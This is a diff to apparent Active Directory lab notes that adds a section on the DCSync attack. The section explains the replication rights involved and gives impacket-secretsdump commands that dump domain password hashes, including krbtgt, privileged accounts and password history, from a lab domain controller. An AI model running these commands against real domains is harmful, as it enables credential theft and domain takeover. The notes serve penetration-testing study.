@@ -350,5 +350,42 @@ impacket-getTGT -dc-ip 192.168.232.129 'cs.org/stafani.ferdinanda:ncc1701' -debu
 ```bash
 export KRB5CCNAME=/home/sensei/AD/lab/stafani.ferdinanda.ccache
 ```
+-----------
 
-- 
+### DCSync Attack
+
+-------------
+
+- The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set
+- Notes-:
+ - The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
+ - By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges.
+ - In practice, full DCSync needs DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on the domain naming context. DS-Replication-Get-Changes-In-Filtered-Set is commonly delegated together with them, but on its own it is more relevant for syncing confidential / RODC-filtered attributes (for example legacy LAPS-style secrets) than for a full krbtgt dump
+ - If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text.
+
+- Spotting with bloodhound-:
+
+<img width="1633" height="809" alt="image" src="https://github.com/user-attachments/assets/52c036ee-b241-4ffe-b91d-5d68bd918d2b" />
+
+- Attacking remotely-:
+
+```bash
+impacket-secretsdump  -just-dc mag.bekki:ncc1701@192.168.232.129 -outputfile dcsync_hashes
+```
+
+<img width="967" height="336" alt="image" src="https://github.com/user-attachments/assets/5d3a517e-b5b5-42b1-8dc2-f0b4f7d00257" />
+
+- Others
+
+```bash
+# Only the krbtgt account
+secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
+
+# Only privileged objects selected through LDAP
+secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
+
+# Add metadata and password history for cracking/reuse analysis
+secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
+```
+
+---------------
